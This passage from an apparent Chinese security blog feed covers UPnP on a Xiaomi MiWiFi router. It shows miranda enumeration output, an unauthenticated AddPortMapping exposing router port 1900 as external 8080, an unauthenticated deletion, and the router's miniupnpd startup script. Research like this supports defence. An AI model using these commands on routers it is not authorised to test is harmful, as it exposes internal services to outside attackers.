WANConnectionDevice</span><br><span class="line"></span><br><span class="line">  manufacturerURL : http://miniupnp.free.fr/</span><br><span class="line">  modelName : MiniUPnPd</span><br><span class="line">  UPC : 000000000000</span><br><span class="line">  modelNumber : 20180830</span><br><span class="line">  friendlyName : WANConnectionDevice</span><br><span class="line">  fullName : urn:schemas-upnp-org:device:WANConnectionDevice:1</span><br><span class="line">  modelDescription : MiniUPnP daemon</span><br><span class="line">  UDN : uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8e</span><br><span class="line">  modelURL : http://miniupnp.free.fr/</span><br><span class="line">  manufacturer : MiniUPnP</span><br><span class="line">  services : &#123;&#125;</span><br><span class="line"></span><br><span class="line">upnp&gt; host info 0 deviceList WANConnectionDevice services WANIPConnection</span><br><span class="line"></span><br><span class="line">    eventSubURL : /evt/IPConn</span><br><span class="line">    controlURL : /ctl/IPConn</span><br><span class="line">    serviceId : urn:upnp-org:serviceId:WANIPConn1</span><br><span class="line">    SCPDURL : /WANIPCn.xml</span><br><span class="line">    fullName : urn:schemas-upnp-org:service:WANIPConnection:1</span><br><span class="line">    actions : &#123;&#125;</span><br><span class="line">    serviceStateVariables : &#123;&#125;</span><br><span class="line"></span><br><span class="line">upnp&gt; host info 0 deviceList WANConnectionDevice services WANIPConnection actions</span><br><span class="line"></span><br><span class="line">      AddPortMapping : &#123;&#125;</span><br><span class="line">      GetNATRSIPStatus : &#123;&#125;</span><br><span class="line">      GetGenericPortMappingEntry : &#123;&#125;</span><br><span class="line">      GetSpecificPortMappingEntry : &#123;&#125;</span><br><span class="line">      ForceTermination : &#123;&#125;</span><br><span class="line">      GetExternalIPAddress : &#123;&#125;</span><br><span class="line">      GetConnectionTypeInfo : &#123;&#125;</span><br><span class="line">      GetStatusInfo : &#123;&#125;</span><br><span class="line">      SetConnectionType : &#123;&#125;</span><br><span class="line">      DeletePortMapping : &#123;&#125;</span><br><span class="line">      RequestConnection : &#123;&#125;</span><br><span class="line"></span><br><span class="line">upnp&gt; host info 0 deviceList WANConnectionDevice services WANIPConnection serviceStateVariables</span><br><span class="line"></span><br><span class="line">        InternalClient : &#123;&#125;</span><br><span class="line">        Uptime : &#123;&#125;</span><br><span class="line">        PortMappingLeaseDuration : &#123;&#125;</span><br><span class="line">        PortMappingDescription : &#123;&#125;</span><br><span class="line">        RemoteHost : &#123;&#125;</span><br><span class="line">        PossibleConnectionTypes : &#123;&#125;</span><br><span class="line">        ExternalPort : &#123;&#125;</span><br><span class="line">        RSIPAvailable : &#123;&#125;</span><br><span class="line">        ConnectionStatus : &#123;&#125;</span><br><span class="line">        PortMappingNumberOfEntries : &#123;&#125;</span><br><span class="line">        ExternalIPAddress : &#123;&#125;</span><br><span class="line">        ConnectionType : &#123;&#125;</span><br><span class="line">        NATEnabled : &#123;&#125;</span><br><span class="line">        LastConnectionError : &#123;&#125;</span><br><span class="line">        InternalPort : &#123;&#125;</span><br><span class="line">        PortMappingProtocol : &#123;&#125;</span><br><span class="line">        PortMappingEnabled : &#123;&#125;</span><br><span class="line"></span><br><span class="line">upnp&gt; host summary 0</span><br><span class="line"></span><br><span class="line">          Host: 192.168.31.1:5351</span><br><span class="line">          XML File: http://192.168.31.1:5351/rootDesc.xml</span><br><span class="line">          InternetGatewayDevice</span><br><span class="line">          manufacturerURL: http://www.mi.com</span><br><span class="line">          modelName: MiWiFi Router</span><br><span class="line">          UPC: 000000000000</span><br><span class="line">          modelNumber: 20180830</span><br><span class="line">          presentationURL: http://miwifi.com/</span><br><span class="line">          friendlyName: MiWiFi router</span><br><span class="line">          fullName: urn:schemas-upnp-org:device:InternetGatewayDevice:1</span><br><span class="line">          modelDescription: MiWiFi Router</span><br><span class="line">          UDN: uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8c</span><br><span class="line">          modelURL: http://www1.miwifi.com</span><br><span class="line">          manufacturer: Xiaomi</span><br><span class="line">          WANDevice</span><br><span class="line">          manufacturerURL: http://miniupnp.free.fr/</span><br><span class="line">          modelName: WAN Device</span><br><span class="line">          UPC: 000000000000</span><br><span class="line">          modelNumber: 20180830</span><br><span class="line">          friendlyName: WANDevice</span><br><span class="line">          fullName: urn:schemas-upnp-org:device:WANDevice:1</span><br><span class="line">          modelDescription: WAN Device</span><br><span class="line">          UDN: uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8d</span><br><span class="line">          modelURL: http://miniupnp.free.fr/</span><br><span class="line">          manufacturer: MiniUPnP</span><br><span class="line">          WANConnectionDevice</span><br><span class="line">          manufacturerURL: http://miniupnp.free.fr/</span><br><span class="line">          modelName: MiniUPnPd</span><br><span class="line">          UPC: 000000000000</span><br><span class="line">          modelNumber: 20180830</span><br><span class="line">          friendlyName: WANConnectionDevice</span><br><span class="line">          fullName: urn:schemas-upnp-org:device:WANConnectionDevice:1</span><br><span class="line">          modelDescription: MiniUPnP daemon</span><br><span class="line">          UDN: uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8e</span><br><span class="line">          modelURL: http://miniupnp.free.fr/</span><br><span class="line">          manufacturer: MiniUPnP</span><br></pre></td></tr></table></figure><ul><li>使用miranda发送UPnP命令<br><strong>获取外部IP地址</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upnp&gt; host send 0 WANConnectionDevice WANIPConnection GetExternalIPAddress</span><br><span class="line"></span><br><span class="line">NewExternalIPAddress : 172.16.173.231</span><br></pre></td></tr></table></figure><p><strong>增加一个端口映射，将路由器上端口为1900的服务映射到外网端口8080</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">upnp&gt; host send 0 WANConnectionDevice WANIPConnection AddPortMapping</span><br><span class="line"></span><br><span class="line">Required argument:</span><br><span class="line">Argument Name:  NewPortMappingDescription</span><br><span class="line">Data Type:      string</span><br><span class="line">Allowed Values: []</span><br><span class="line">Set NewPortMappingDescription value to: HACK</span><br><span class="line"></span><br><span class="line">Required argument:</span><br><span class="line">Argument Name:  NewLeaseDuration</span><br><span class="line">Data Type:      ui4</span><br><span class="line">Allowed Values: []</span><br><span class="line">Value Min:      0</span><br><span class="line">Value Max:      604800</span><br><span class="line">Set NewLeaseDuration value to: 0</span><br><span class="line"></span><br><span class="line">Required argument:</span><br><span class="line">Argument Name:  NewInternalClient</span><br><span class="line">Data Type:      string</span><br><span class="line">Allowed Values: []</span><br><span class="line">Set NewInternalClient value to: 192.168.31.1</span><br><span class="line"></span><br><span class="line">Required argument:</span><br><span class="line">Argument Name:  NewEnabled</span><br><span class="line">Data Type:      boolean</span><br><span class="line">Allowed Values: []</span><br><span class="line">Set NewEnabled value to: 1</span><br><span class="line"></span><br><span class="line">Required argument:</span><br><span class="line">Argument Name:  NewExternalPort</span><br><span class="line">Data Type:      ui2</span><br><span class="line">Allowed Values: []</span><br><span class="line">Set NewExternalPort value to: 8080</span><br><span class="line"></span><br><span class="line">Required argument:</span><br><span class="line">Argument Name:  NewRemoteHost</span><br><span class="line">Data Type:      string</span><br><span class="line">Allowed Values: []</span><br><span class="line">Set NewRemoteHost value to:</span><br><span class="line"></span><br><span class="line">Required argument:</span><br><span class="line">Argument Name:  NewProtocol</span><br><span class="line">Data Type:      string</span><br><span class="line">Allowed Values: [&apos;TCP&apos;, &apos;UDP&apos;]</span><br><span class="line">Set NewProtocol value to: TCP</span><br><span class="line"></span><br><span class="line">Required argument:</span><br><span class="line">Argument Name:  NewInternalPort</span><br><span class="line">Data Type:      ui2</span><br><span class="line">Allowed Values: []</span><br><span class="line">Value Min:      1</span><br><span class="line">Value Max:      65535</span><br><span class="line">Set NewInternalPort value to: 1900</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">upnp&gt; host send 0 WANConnectionDevice WANIPConnection GetSpecificPortMappingEntry</span><br><span class="line"></span><br><span class="line">  Required argument:</span><br><span class="line">  Argument Name:  NewExternalPort</span><br><span class="line">  Data Type:      ui2</span><br><span class="line">  Allowed Values: []</span><br><span class="line">  Set NewExternalPort value to: 8080</span><br><span class="line"></span><br><span class="line">  Required argument:</span><br><span class="line">  Argument Name:  NewRemoteHost</span><br><span class="line">  Data Type:      string</span><br><span class="line">  Allowed Values: []</span><br><span class="line">  Set NewRemoteHost value to:</span><br><span class="line"></span><br><span class="line">  Required argument:</span><br><span class="line">  Argument Name:  NewProtocol</span><br><span class="line">  Data Type:      string</span><br><span class="line">  Allowed Values: [&apos;TCP&apos;, &apos;UDP&apos;]</span><br><span class="line">  Set NewProtocol value to: TCP</span><br><span class="line"></span><br><span class="line">  NewPortMappingDescription : HACK</span><br><span class="line">  NewLeaseDuration : 0</span><br><span class="line">  NewInternalClient : 192.168.31.1</span><br><span class="line">  NewEnabled : 1</span><br><span class="line">  NewInternalPort : 1900</span><br></pre></td></tr></table></figure><p><strong>可以无需验证地删除映射</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upnp&gt; host send 0 WANConnectionDevice WANIPConnection DeletePortMapping</span><br></pre></td></tr></table></figure></p><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555918880/paper/2231.png" alt><br>虽然UPnP是一种很少理解的协议，但它在绝大多数家庭网络上都很活跃，甚至在某些公司网络上也是如此。许多设备支持UPnP以便于消费者使用，但是，它们通常支持不允许任何服务自动执行的操作，尤其是未经授权的情况下。更糟糕的是，协议实现本身很少以安全思维构建，使其可以进一步利用。<br>防止本地/远程利用UPnP的最佳方法是在任何/所有网络设备上禁用该功能。然而，考虑到这个协议和其他“自动魔术”协议旨在帮助懒惰的用户，他们可能不知道这些协议的危险，唯一真正的解决方案是让供应商更加关注他们的设计和实施，并且更加安全。</p><h2 id="浏览配置文件"><a href="#浏览配置文件" class="headerlink" title="浏览配置文件"></a>浏览配置文件</h2><h3 id="通过find命令搜索"><a href="#通过find命令搜索" class="headerlink" title="通过find命令搜索"></a>通过find命令搜索</h3><pre>root@XiaoQiang:/# find -name *upnp*./etc/rc.d/S95miniupnpd./etc/init.d/miniupnpd./etc/hotplug.d/iface/50-miniupnpd./etc/config/upnpd./tmp/upnp.leases./tmp/etc/miniupnpd.conf./tmp/run/miniupnpd.pid./usr/lib/lua/luci/view/web/setting/upnp.htm./usr/sbin/miniupnpd./usr/share/miniupnpd./www/xiaoqiang/web/css/upnp.css./data/etc/rc.d/S95miniupnpd./data/etc/init.d/miniupnpd./data/etc/hotplug.d/iface/50-miniupnpd./data/etc/config/upnpd</pre><ul><li>/etc/rc.d 启动的配置文件和脚本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">!/bin/sh /etc/rc.common</span><br><span class="line"># Copyright (C) 2006-2011 OpenWrt.org</span><br><span class="line"></span><br><span class="line">START=95</span><br><span class="line">SERVICE_USE_PID=1</span><br><span class="line">upnpd_get_port_range() &#123;</span><br><span class="line">        local _var=&quot;$1&quot;; shift</span><br><span class="line">        local _val</span><br><span class="line">        config_get _val &quot;$@&quot;</span><br><span class="line">        case &quot;$_val&quot; in</span><br><span class="line">                [0-9]*[:-][0-9]*)</span><br><span class="line">                        export -n -- &quot;$&#123;_var&#125;_start=$&#123;_val%%[:-]*&#125;&quot;</span><br><span class="line">                        export -n -- &quot;$&#123;_var&#125;_end=$&#123;_val##*[:-]&#125;&quot;</span><br><span class="line">                ;;</span><br><span class="line">                [0-9]*)</span><br><span class="line">                        export -n -- &quot;$&#123;_var&#125;_start=$_val&quot;</span><br><span class="line">                        export -n -- &quot;$&#123;_var&#125;_end=&quot;</span><br><span class="line">                ;;</span><br><span class="line">        esac</span><br><span class="line">&#125;</span><br><span class="line">conf_rule_add() &#123;</span><br><span class="line">        local cfg=&quot;$1&quot;</span><br><span class="line">        local tmpconf=&quot;$2&quot;</span><br><span class="line">        local action external_port_start external_port_end int_addr</span><br><span class="line">        local internal_port_start internal_port_end</span><br><span class="line"></span><br><span class="line">        config_get action &quot;$cfg&quot; action &quot;deny&quot;               # allow or deny</span><br><span class="line">        upnpd_get_port_range &quot;ext&quot; &quot;$cfg&quot; ext_ports &quot;0-65535&quot; # external ports: x, x-y, x:y</span><br><span class="line">        config_get int_addr &quot;$cfg&quot; int_addr &quot;0.0.0.0/0&quot;       # ip or network and subnet mask (internal)</span><br><span class="line">        upnpd_get_port_range &quot;int&quot; &quot;$cfg&quot; int_ports &quot;0-65535&quot; # internal ports: x, x-y, x:y or range</span><br><span class="line"></span><br><span class="line">        # Make a single IP IP/32 so that miniupnpd.conf can use it.</span><br><span class="line">        case &quot;$int_addr&quot; in</span><br><span class="line">                */*) ;;</span><br><span class="line">                *) int_addr=&quot;$int_addr/32&quot; ;;</span><br><span class="line">        esac</span><br><span class="line"></span><br><span class="line">        echo &quot;$&#123;action&#125; $&#123;ext_start&#125;$&#123;ext_end:+-&#125;$&#123;ext_end&#125; $&#123;int_addr&#125; $&#123;int_start&#125;$&#123;int_end:+-&#125;$&#123;int_end&#125;&quot; &gt;&gt;$tmpconf</span><br><span class="line">&#125;</span><br><span class="line">upnpd_write_bool() &#123;                                                                                                   </span><br><span class="line">        local opt=&quot;$1&quot;                                                                                                 </span><br><span class="line">        local def=&quot;$&#123;2:-0&#125;&quot;                                                                                            </span><br><span class="line">        local alt=&quot;$3&quot;                                                                                                 </span><br><span class="line">        local val                                                                                                      </span><br><span class="line"></span><br><span class="line">        config_get_bool val config &quot;$opt&quot; &quot;$def&quot;                                                                       </span><br><span class="line">        if [ &quot;$val&quot; -eq 0 ]; then                                                                                      </span><br><span class="line">                echo &quot;$&#123;alt:-$opt&#125;=no&quot; &gt;&gt; $tmpconf                                                                     </span><br><span class="line">        else                                                                                                           </span><br><span class="line">                echo &quot;$&#123;alt:-$opt&#125;=yes&quot; &gt;&gt; $tmpconf                                                                    </span><br><span class="line">        fi                                                                                                             </span><br><span class="line">&#125;                                                                                                                      </span><br><span class="line"></span><br><span class="line">boot() &#123;                                                                                                               </span><br><span class="line">        return 0                                                                                                       </span><br><span class="line">&#125;                                                                                                                      </span><br><span class="line"></span><br><span class="line">start() &#123;                                                                                                              </span><br><span class="line">        config_load &quot;upnpd&quot;                                                                                            </span><br><span class="line">        local extiface intiface upload download logging secure enabled natpmp                                          </span><br><span class="line">        local extip port usesysuptime conffile serial_number model_number                                              </span><br><span class="line">        local uuid notify_interval presentation_url enable_upnp                                                        </span><br><span class="line">        local upnp_lease_file clean_ruleset_threshold clean_ruleset_interval                                           </span><br><span class="line"></span><br><span class="line">        config_get extiface config external_iface                                                                      </span><br><span class="line">        config_get intiface config internal_iface                                                                      </span><br><span class="line">        config_get extip config external_ip                                                                            </span><br><span class="line">        config_get port config port 5000                                                                               </span><br><span class="line">        config_get upload   config upload                                                                              </span><br><span class="line">        config_get download config download                                                                            </span><br><span class="line">        config_get_bool logging config log_output 0                                                                    </span><br><span class="line">        config_get conffile config config_file                                                                         </span><br><span class="line">        config_get serial_number config serial_number                                                                  </span><br><span class="line">        config_get model_number config model_number                                                                    </span><br><span class="line">        config_get uuid config uuid                                                                                    </span><br><span class="line">        config_get notify_interval config notify_interval                                                              </span><br><span class="line">        config_get presentation_url config presentation_url                                                            </span><br><span class="line">        config_get upnp_lease_file config upnp_lease_file                                                              </span><br><span class="line">        config_get clean_ruleset_threshold config clean_ruleset_threshold                                              </span><br><span class="line">        config_get clean_ruleset_interval config clean_ruleset_interval                                                </span><br><span class="line"></span><br><span class="line">        local args                                                                                                     </span><br><span class="line"></span><br><span class="line">        . /lib/functions/network.sh        </span><br><span class="line">        local ifname                                                                                                   </span><br><span class="line">        network_get_device ifname $&#123;extiface:-wan&#125;                                                                     </span><br><span class="line"></span><br><span class="line">        if [ -n &quot;$conffile&quot; ]; then                                                                                    </span><br><span class="line">                args=&quot;-f $conffile&quot;                                                                                    </span><br><span class="line">        else                                                                                                           </span><br><span class="line">                local tmpconf=&quot;/var/etc/miniupnpd.conf&quot;                                                                </span><br><span class="line">                args=&quot;-f $tmpconf&quot;                                                                                     </span><br><span class="line">                mkdir -p /var/etc                                                                                      </span><br><span class="line"></span><br><span class="line">                echo &quot;ext_ifname=$ifname&quot; &gt;$tmpconf                                                                    </span><br><span class="line"></span><br><span class="line">                [ -n &quot;$extip&quot; ] &amp;&amp; \                                                                                   </span><br><span class="line">                        echo &quot;ext_ip=$extip&quot; &gt;&gt;$tmpconf                                                                </span><br><span class="line"></span><br><span class="line">                local iface                                                                                            </span><br><span class="line">                for iface in $&#123;intiface:-lan&#125;; do                                                                      </span><br><span class="line">                        local device                                                                                   </span><br><span class="line">                        network_get_device device &quot;$iface&quot; &amp;&amp; &#123;                                                        </span><br><span class="line">                                echo &quot;listening_ip=$device&quot; &gt;&gt;$tmpconf                                                 </span><br><span class="line">                        &#125;                                                                                              </span><br><span class="line">                done                                                                                                   </span><br><span class="line"></span><br><span class="line">                [ &quot;$port&quot; != &quot;auto&quot; ] &amp;&amp; \                                                                             </span><br><span class="line">                        echo &quot;port=$port&quot; &gt;&gt;$tmpconf                                                                   </span><br><span class="line"></span><br><span class="line">                config_load &quot;upnpd&quot;                                                                                    </span><br><span class="line">                upnpd_write_bool enable_natpmp 1                             </span><br><span class="line">                upnpd_write_bool enable_upnp 1                               </span><br><span class="line">                upnpd_write_bool secure_mode 1                               </span><br><span class="line">                upnpd_write_bool system_uptime 1    </span><br><span class="line">                [ -n &quot;$upnp_lease_file&quot; ] &amp;&amp; &#123;                                                                         </span><br><span class="line">                        touch $upnp_lease_file                                                                         </span><br><span class="line">                        echo &quot;lease_file=$upnp_lease_file&quot; &gt;&gt;$tmpconf                                                  </span><br><span class="line">                &#125;                                                                                                      </span><br><span class="line"></span><br><span class="line">                [ -n &quot;$upload&quot; -a -n &quot;$download&quot; ] &amp;&amp; &#123;                                                                </span><br><span class="line">                        echo &quot;bitrate_down=$(($download * 1024 * 8))&quot; &gt;&gt;$tmpconf                                       </span><br><span class="line">                        echo &quot;bitrate_up=$(($upload * 1024 * 8))&quot; &gt;&gt;$tmpconf                                           </span><br><span class="line">                &#125;                                                                                                      </span><br><span class="line"></span><br><span class="line">                [ -n &quot;$&#123;presentation_url&#125;&quot; ] &amp;&amp; \                                                                      </span><br><span class="line">                        echo &quot;presentation_url=$&#123;presentation_url&#125;&quot; &gt;&gt;$tmpconf                                         </span><br><span class="line"></span><br><span class="line">                [ -n &quot;$&#123;notify_interval&#125;&quot; ] &amp;&amp; \                                                                       </span><br><span class="line">                        echo &quot;notify_interval=$&#123;notify_interval&#125;&quot; &gt;&gt;$tmpconf                                           </span><br><span class="line"></span><br><span class="line">                [ -n &quot;$&#123;clean_ruleset_threshold&#125;&quot; ] &amp;&amp; \                                                               </span><br><span class="line">                        echo &quot;clean_ruleset_threshold=$&#123;clean_ruleset_threshold&#125;&quot; &gt;&gt;$tmpconf                           </span><br><span class="line"></span><br><span class="line">                [ -n &quot;$&#123;clean_ruleset_interval&#125;&quot; ] &amp;&amp; \                                                                </span><br><span class="line">                        echo &quot;clean_ruleset_interval=$&#123;clean_ruleset_interval&#125;&quot; &gt;&gt;$tmpconf                             </span><br><span class="line"></span><br><span class="line">                [ -z &quot;$uuid&quot; ] &amp;&amp; &#123;                                                                                    </span><br><span class="line">                        uuid=&quot;$(cat /proc/sys/kernel/random/uuid)&quot;                                                     </span><br><span class="line">                        uci set upnpd.config.uuid=$uuid                                                                </span><br><span class="line">                        uci commit upnpd                                                                               </span><br><span class="line">                &#125;                                                                                                      </span><br><span class="line"></span><br><span class="line">                [ &quot;$uuid&quot; = &quot;nocli&quot; ] || \                                                                             </span><br><span class="line">                        echo &quot;uuid=$uuid&quot; &gt;&gt;$tmpconf                                                                   </span><br><span class="line"></span><br><span class="line">                [ -n &quot;$&#123;serial_number&#125;&quot; ] &amp;&amp; \                                                                         </span><br><span class="line">                        echo &quot;serial=$&#123;serial_number&#125;&quot; &gt;&gt;$tmpconf                                                      </span><br><span class="line"></span><br><span class="line">                [ -n &quot;$&#123;model_number&#125;&quot; ] &amp;&amp; \                                               </span><br><span class="line">                        echo &quot;model_number=$&#123;model_number&#125;&quot; &gt;&gt;$tmpconf        </span><br><span class="line">                        config_foreach conf_rule_add perm_rule &quot;$tmpconf&quot;                                                          </span><br><span class="line">                    fi                                                                                                             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    if [ -n &quot;$ifname&quot; ]; then                                                                                      </span><br><span class="line">                            # start firewall                                                                                       </span><br><span class="line">                            iptables -L MINIUPNPD &gt;/dev/null 2&gt;/dev/null || fw3 reload                                             </span><br><span class="line"></span><br><span class="line">                            if [ &quot;$logging&quot; = &quot;1&quot; ]; then                                                                          </span><br><span class="line">                                    SERVICE_DAEMONIZE=1 \                                                                          </span><br><span class="line">                                    service_start /usr/sbin/miniupnpd $args -d                                                     </span><br><span class="line">                            else                                                                                                   </span><br><span class="line">                                    SERVICE_DAEMONIZE= \                                                                           </span><br><span class="line">                                    service_start /usr/sbin/miniupnpd $args                                                        </span><br><span class="line">                            fi                                                                                                     </span><br><span class="line">                    else                                                                                                           </span><br><span class="line">                            logger -t &quot;upnp daemon&quot; &quot;external interface not found, not starting&quot;                                   </span><br><span class="line">                    fi                                                                                                             </span><br><span class="line">                    return 0                                                                                                       </span><br><span class="line">            &#125;                                                                                                                      </span><br><span class="line"></span><br><span class="line">            stop() &#123;                                                                                                               </span><br><span class="line">                    service_stop /usr/sbin/miniupnpd                                                                               </span><br><span class="line"></span><br><span class="line">                    iptables -t nat -F MINIUPNPD 2&gt;/dev/null                                            </span><br><span class="line">                    iptables -t filter -F MINIUPNPD 2&gt;/dev/null                                         </span><br><span class="line">                    return 0                                                                            </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>SmartController<br>messagingagent</p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小米 </tag>
            
            <tag> 路由器 </tag>
            
            <tag> MiniUPnP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复原数据库存储以检测和跟踪安全漏洞</title>
      <link href="/2019/04/15/Caving-db-storage/"/>
      <url>/2019/04/15/Caving-db-storage/</url>
      
